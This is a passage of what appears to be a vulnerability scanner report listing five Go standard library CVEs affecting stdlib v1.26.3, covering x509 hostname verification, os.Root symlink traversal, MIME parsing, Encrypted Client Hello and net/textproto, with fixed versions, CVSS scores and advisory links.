      │     ├ PublishedDate   : 2026-07-21T22:03:55Z 
      │     ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
      ├ [2] ╭ VulnerabilityID : CVE-2026-27145 
      │     ├ VendorIDs        ─ [0]: GO-2026-5037 
      │     ├ PkgID           : stdlib@v1.26.3 
      │     ├ PkgName         : stdlib 
      │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
      │     │                  ╰ UID : b958562af177c902 
      │     ├ InstalledVersion: v1.26.3 
      │     ├ FixedVersion    : 1.25.11, 1.26.4 
      │     ├ Status          : fixed 
      │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
      │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
      │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27145 
      │     ├ DataSource       ╭ ID  : govulndb 
      │     │                  ├ Name: The Go Vulnerability Database 
      │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
      │     ├ Fingerprint     : sha256:8a78c85b24a632e8fa4bb3f8ca8cd111aa837a29b3104959885f394815e6053c 
      │     ├ Title           : crypto/x509: golang: golang crypto/x509: Denial of Service via excessive
      │     │                   processing of DNS SAN entries 
      │     ├ Description     : (*x509.Certificate).VerifyHostname previously called matchHostnames in a loop
      │     │                   over all DNS Subject Alternative Name (SAN) entries. This caused
      │     │                   strings.Split(host, ".") to execute repeatedly on the same input hostname. With
      │     │                    a large DNS SAN list, verification costs scaled quadratically based on the
      │     │                   number of SAN entries multiplied by the hostname's label count. Because
      │     │                   x509.Verify validates hostnames before building the certificate chain, this
      │     │                   overhead occurred even for untrusted certificates. 
      │     ├ Severity        : HIGH 
      │     ├ CweIDs           ─ [0]: CWE-606 
      │     ├ VendorSeverity   ╭ alma       : 3 
      │     │                  ├ amazon     : 2 
      │     │                  ├ bitnami    : 2 
      │     │                  ├ oracle-oval: 3 
      │     │                  ├ redhat     : 3 
      │     │                  ╰ rocky      : 3 
      │     ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:H 
      │     │                  │         ╰ V3Score : 6.5 
      │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
      │     │                            ╰ V3Score : 7.5 
      │     ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
      │     │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
      │     │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:29981 
      │     │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:33574 
      │     │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:34357 
      │     │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:34359 
      │     │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:35832 
      │     │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:36317 
      │     │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36648 
      │     │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36797 
      │     │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:38995 
      │     │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:39005 
      │     │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:39573 
      │     │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:39879 
      │     │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:41030 
      │     │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:41036 
      │     │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:41930 
      │     │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:42043 
      │     │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:42047 
      │     │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:42049 
      │     │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:42050 
      │     │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:42051 
      │     │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:42079 
      │     │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:42080 
      │     │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:42082 
      │     │                  ├ [25]: https://access.redhat.com/errata/RHSA-2026:42142 
      │     │                  ├ [26]: https://access.redhat.com/errata/RHSA-2026:42150 
      │     │                  ├ [27]: https://access.redhat.com/errata/RHSA-2026:42151 
      │     │                  ├ [28]: https://access.redhat.com/errata/RHSA-2026:42240 
      │     │                  ├ [29]: https://access.redhat.com/errata/RHSA-2026:42644 
      │     │                  ├ [30]: https://access.redhat.com/errata/RHSA-2026:42946 
      │     │                  ├ [31]: https://access.redhat.com/security/cve/CVE-2026-27145 
      │     │                  ├ [32]: https://bugzilla.redhat.com/2445356 
      │     │                  ├ [33]: https://bugzilla.redhat.com/2484207 
      │     │                  ├ [34]: https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
      │     │                  ├ [35]: https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
      │     │                  ├ [36]: https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
      │     │                  ├ [37]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
      │     │                  ├ [38]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
      │     │                  ├ [39]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
      │     │                  ├ [40]: https://errata.almalinux.org/9/ALSA-2026-36317.html 
      │     │                  ├ [41]: https://errata.rockylinux.org/RLSA-2026:38995 
      │     │                  ├ [42]: https://go.dev/cl/783621 
      │     │                  ├ [43]: https://go.dev/issue/79694 
      │     │                  ├ [44]: https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw 
      │     │                  ├ [45]: https://linux.oracle.com/cve/CVE-2026-27145.html 
      │     │                  ├ [46]: https://linux.oracle.com/errata/ELSA-2026-39573.html 
      │     │                  ├ [47]: https://nvd.nist.gov/vuln/detail/CVE-2026-27145 
      │     │                  ├ [48]: https://pkg.go.dev/vuln/GO-2026-5037 
      │     │                  ├ [49]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-27145.
      │     │                  │       json 
      │     │                  ╰ [50]: https://www.cve.org/CVERecord?id=CVE-2026-27145 
      │     ├ PublishedDate   : 2026-06-02T23:16:35.57Z 
      │     ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
      ├ [3] ╭ VulnerabilityID : CVE-2026-39822 
      │     ├ VendorIDs        ─ [0]: GO-2026-4970 
      │     ├ PkgID           : stdlib@v1.26.3 
      │     ├ PkgName         : stdlib 
      │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
      │     │                  ╰ UID : b958562af177c902 
      │     ├ InstalledVersion: v1.26.3 
      │     ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
      │     ├ Status          : fixed 
      │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
      │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
      │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39822 
      │     ├ DataSource       ╭ ID  : govulndb 
      │     │                  ├ Name: The Go Vulnerability Database 
      │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
      │     ├ Fingerprint     : sha256:5ef45c223a7faae0131693e32a132dc0941b43613cd6a7ad72d51345544eac00 
      │     ├ Title           : os: golang: Go os.Root: Symlink following vulnerability allows directory
      │     │                   traversal 
      │     ├ Description     : On Unix systems, opening a file in an os.Root improperly follows symlinks to
      │     │                   locations outside of the Root when the final path component of the a path is a
      │     │                   symbolic link and the path ends in /. For example, 'root.Open("symlink/")' will
      │     │                    open "symlink" even when "symlink" is a symbolic link pointing outside of the
      │     │                   root. 
      │     ├ Severity        : HIGH 
      │     ├ CweIDs           ─ [0]: CWE-61 
      │     ├ VendorSeverity   ╭ alma       : 3 
      │     │                  ├ amazon     : 2 
      │     │                  ├ bitnami    : 3 
      │     │                  ├ oracle-oval: 3 
      │     │                  ├ redhat     : 3 
      │     │                  ╰ rocky      : 3 
      │     ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
      │     │                  │         ╰ V3Score : 7.8 
      │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
      │     │                            ╰ V3Score : 7.8 
      │     ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38878 
      │     │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-39822 
      │     │                  ├ [2] : https://bugzilla.redhat.com/2498152 
      │     │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
      │     │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
      │     │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
      │     │                  ├ [6] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
      │     │                  ├ [7] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39821 
      │     │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
      │     │                  ├ [9] : https://errata.almalinux.org/9/ALSA-2026-38878.html 
      │     │                  ├ [10]: https://errata.rockylinux.org/RLSA-2026:38995 
      │     │                  ├ [11]: https://go.dev/cl/797880 
      │     │                  ├ [12]: https://go.dev/issue/79005 
      │     │                  ├ [13]: https://groups.google.com/g/golang-announce/c/OrmQE_Yp5Sc 
      │     │                  ├ [14]: https://linux.oracle.com/cve/CVE-2026-39822.html 
      │     │                  ├ [15]: https://linux.oracle.com/errata/ELSA-2026-38995.html 
      │     │                  ├ [16]: https://nvd.nist.gov/vuln/detail/CVE-2026-39822 
      │     │                  ├ [17]: https://pkg.go.dev/vuln/GO-2026-4970 
      │     │                  ╰ [18]: https://www.cve.org/CVERecord?id=CVE-2026-39822 
      │     ├ PublishedDate   : 2026-07-08T17:17:21.31Z 
      │     ╰ LastModifiedDate: 2026-07-13T14:54:26.317Z 
      ├ [4] ╭ VulnerabilityID : CVE-2026-42504 
      │     ├ VendorIDs        ─ [0]: GO-2026-5038 
      │     ├ PkgID           : stdlib@v1.26.3 
      │     ├ PkgName         : stdlib 
      │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
      │     │                  ╰ UID : b958562af177c902 
      │     ├ InstalledVersion: v1.26.3 
      │     ├ FixedVersion    : 1.25.11, 1.26.4 
      │     ├ Status          : fixed 
      │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
      │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
      │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42504 
      │     ├ DataSource       ╭ ID  : govulndb 
      │     │                  ├ Name: The Go Vulnerability Database 
      │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
      │     ├ Fingerprint     : sha256:bf74ff926d44317a7fa2b553599ee3be48d4d5ffdacaa6726fe53f6c44fd8eca 
      │     ├ Title           : mime: golang: Golang MIME: Denial of Service via maliciously-crafted MIME header 
      │     ├ Description     : Decoding a maliciously-crafted MIME header containing many invalid
      │     │                   encoded-words can consume excessive CPU. 
      │     ├ Severity        : HIGH 
      │     ├ CweIDs           ─ [0]: CWE-407 
      │     ├ VendorSeverity   ╭ amazon : 2 
      │     │                  ├ azure  : 3 
      │     │                  ├ bitnami: 3 
      │     │                  ╰ redhat : 3 
      │     ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
      │     │                  │         ╰ V3Score : 7.5 
      │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
      │     │                            ╰ V3Score : 7.5 
      │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42504 
      │     │                  ├ [1]: https://go.dev/cl/774481 
      │     │                  ├ [2]: https://go.dev/issue/79217 
      │     │                  ├ [3]: https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw 
      │     │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42504 
      │     │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5038 
      │     │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42504 
      │     ├ PublishedDate   : 2026-06-02T23:16:37.927Z 
      │     ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
      ├ [5] ╭ VulnerabilityID : CVE-2026-42505 
      │     ├ VendorIDs        ─ [0]: GO-2026-5856 
      │     ├ PkgID           : stdlib@v1.26.3 
      │     ├ PkgName         : stdlib 
      │     ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
      │     │                  ╰ UID : b958562af177c902 
      │     ├ InstalledVersion: v1.26.3 
      │     ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
      │     ├ Status          : fixed 
      │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
      │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
      │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42505 
      │     ├ DataSource       ╭ ID  : govulndb 
      │     │                  ├ Name: The Go Vulnerability Database 
      │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
      │     ├ Fingerprint     : sha256:a68a1d5f0ef6f64cd4a6e8e064128c7a84163de306810de12c908d3efc02e266 
      │     ├ Title           : crypto/tls: golang: Go crypto/tls: Information disclosure in Encrypted Client
      │     │                   Hello 
      │     ├ Description     : Handshakes which used Encrypted Client Hello could be de-anonymized by a
      │     │                   passive network observer due to a disclosure of pre-shared key identities in
      │     │                   the unencrypted client hello. 
      │     ├ Severity        : MEDIUM 
      │     ├ CweIDs           ─ [0]: CWE-201 
      │     ├ VendorSeverity   ╭ amazon : 2 
      │     │                  ├ bitnami: 2 
      │     │                  ╰ redhat : 2 
      │     ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N 
      │     │                  │         ╰ V3Score : 5.3 
      │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N 
      │     │                            ╰ V3Score : 5.3 
      │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-42505 
      │     │                  ├ [1]: https://go.dev/cl/775960 
      │     │                  ├ [2]: https://go.dev/issue/79282 
      │     │                  ├ [3]: https://groups.google.com/g/golang-announce/c/OrmQE_Yp5Sc 
      │     │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-42505 
      │     │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-5856 
      │     │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42505 
      │     ├ PublishedDate   : 2026-07-08T17:17:21.497Z 
      │     ╰ LastModifiedDate: 2026-07-13T17:05:36.303Z 
      ╰ [6] ╭ VulnerabilityID : CVE-2026-42507 
            ├ VendorIDs        ─ [0]: GO-2026-5039 
            ├ PkgID           : stdlib@v1.26.3 
            ├ PkgName         : stdlib 
            ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.3 
            │                  ╰ UID : b958562af177c902 
            ├ InstalledVersion: v1.26.3 
            ├ FixedVersion    : 1.25.11, 1.26.4 
            ├ Status          : fixed 
            ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
            │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
            ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42507 
            ├ DataSource       ╭ ID  : govulndb 
            │                  ├ Name: The Go Vulnerability Database 
            │                  ╰ URL : https://pkg.go.dev/vuln/ 
            ├ Fingerprint     : sha256:e4464145479aa78d5453edf5c5564195e1d0b0c28f8933b615139536751c9443 
            ├ Title           : net/textproto: golang: Golang net/textproto: Misleading error messages via
            │                   input injection 
            ├ Description     : When returning errors, functions in the net/textproto package would include its
            │                    input as part of the error. This might allow an attacker to inject misleading
            │                   content to errors that are printed or logged. 
            ├ Severity        : MEDIUM 
            ├ VendorSeverity   ╭ alma       : 2 
            │                  ├ amazon     : 2 
            │                  ├ bitnami    : 2 
            │                  ├ oracle-oval: 2 
            │                  ├ redhat     : 2 
            │                  ╰ rocky      : 2 
            ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
            │                  │         ╰ V3Score : 5.3 
            │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
            │                            ╰ V3Score : 5.3 
            ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29981 
            │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-42507 
            │                  ├ [2] : https://bugzilla.redhat.com/2484205 
            │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2484205 
            │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42507 
            │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-29981.html 
            │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:29980 
            │                  ├ [7] : https://go.dev/cl/777060 
            │                  ├ [8] : https://go.dev/issue/79346 
            │                  ├ [9] : https://groups.google.com/g/golang-announce/c/tKs3rmcBcKw 
            │                  ├ [10]: https://linux.oracle.com/cve/CVE-2026-42507.html 
            │                  ├ [11]: https://linux.oracle.com/errata/ELSA-2026-29981.html 
            │                  ├ [12]: https://nvd.nist.gov/vuln/detail/CVE-2026-42507 
            │                  ├ [13]: https://pkg.go.dev/vuln/GO-2026-5039 
            │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-42507 
            ├ PublishedDate   : 2026-06-02T23:16:38.027Z 
            ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
```
